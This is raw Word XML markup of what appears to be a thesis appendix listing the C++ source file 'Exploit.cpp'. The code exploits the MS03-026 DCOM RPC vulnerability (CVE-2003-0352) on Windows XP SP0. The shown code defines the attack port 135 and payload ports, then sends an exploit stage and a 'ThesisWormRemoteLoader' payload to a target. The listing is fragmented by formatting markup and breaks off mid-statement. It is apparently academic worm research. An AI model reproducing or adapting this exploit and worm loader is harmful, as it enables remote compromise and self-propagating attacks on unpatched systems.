        <w:t>241</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="009B2D4D">
      <w:pPr>
        <w:spacing w:line="24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60"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CB26A3" w:rsidRPr="00861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861880" w:rsidRDefault="00CB26A3" w:rsidP="009B2D4D">
            <w:pPr>
              <w:spacing w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:shd w:val="solid" w:color="E9E8E2" w:fill="E9E8E2"/>
              </w:rPr>
              <w:t>Exploit.cpp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="009B2D4D" w:rsidP="009B2D4D">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>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t xml:space="preserve"> 1 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="E9EFF8" w:fill="E9EFF8"/>
        </w:rPr>
        <w:t xml:space="preserve">/* </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  2 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* File:   Exploit.cpp</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  3 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">* Author: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>rbeede</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  4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5 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* Created on March 21, 2012, 7:09 PM</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  6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  7 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* Exploits MS03-026_dcom_exploit (CVE-2003-0352)</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  8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9 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* Designed for Windows XP SP0 32-bit</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 10 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>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 11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12 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 13 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>#include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"Exploit.hpp"</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 14 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 15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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>EXPLOIT_PORT</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"135"</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16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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PAYLOAD_PORT</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"4444"</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17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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PAYLOAD_LOADER_PORT</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"65534"</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18 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 19 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 20 Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>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21 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 22 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 23 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 24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25 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>* Destructor</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 26  </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>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27 Exploit::~</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Exploit</w:t>
      </w:r>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28 }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 29 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 30 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 31 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000E6"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>bool</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exploit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32         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Send remote loader to PAYLOAD_PORT</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 33         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Sending exploit stage"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34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sendToTarget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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>EXPLOIT_PORT</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exploitBytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, Exploit::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exploitBytes_length</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35                 logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"ERROR:  Failed to send exploit stage payload to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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>EXPLOIT_PORT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36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37         }</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 38         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 39         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Sleep for 1 second to allow the exploit time to load and listen</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 40         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="2E92C7"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>sleep</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>(1);</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 41         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 42         </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">// Send </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ThesisWormRemoteLoader</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> payload</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve"> 43         logger-&gt;log(</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="CE7B00"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>"Sending remote loader payload"</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44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sendToTarget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Exploit::</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="009900"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PAYLOAD_PORT</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, Exploit::</w:t>
      </w:r>
